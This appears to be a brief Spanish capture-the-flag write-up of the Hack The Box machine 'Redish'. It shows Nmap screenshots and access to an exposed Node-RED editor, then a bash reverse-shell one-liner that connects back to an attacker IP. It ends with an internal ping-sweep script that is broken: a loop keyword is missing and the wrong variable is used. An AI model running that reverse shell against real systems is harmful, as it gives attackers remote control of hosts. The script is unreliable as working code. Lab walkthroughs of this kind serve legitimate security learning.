# Redish

## NMAP

![image](https://github.com/gecr07/RedishHTB/assets/63270579/325411cf-e1b7-49a2-b667-067b49606bb8)

![image](https://github.com/gecr07/RedishHTB/assets/63270579/911975ed-cde7-47ac-8df7-904c60b548c9)

Ahora (no hubiera sabido como la verdad) visitamos el link.

> http://10.10.10.94:1880/red/e72c52ec2ba93670b5b9fcc018afcdff

![image](https://github.com/gecr07/RedishHTB/assets/63270579/e38e48cf-9265-49b5-a93c-1bd6a15f2ffb)


Una vez dentro pues nos damos cuenta que la shell esta muy precaria ( y asi lo hacen todos los writes que he visto nos mandamos otro shell

```
[object Object]bash -c "bash -i >& /dev/tcp/10.10.14.28/1234 0>&1"
```

![image](https://github.com/gecr07/RedishHTB/assets/63270579/484e0234-1c4e-4ba5-b818-23bd4fb61d5a)

Descubrimiento de puertos.

```
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo...\n"
    exit 1
}

trap ctrl_c INT


networks=(172.18.0 172.19.0)


tput civis; for network in ${networks[@]}
    for i in $(seq 1 254); do
        timeout 1 bash -c "ping -c 1 $networks.$i" &>/dev/null && echo -e "\t[+] Host $network.$i -ACTIVE" &
    done; wait 

done; tput cnorm
```










































































































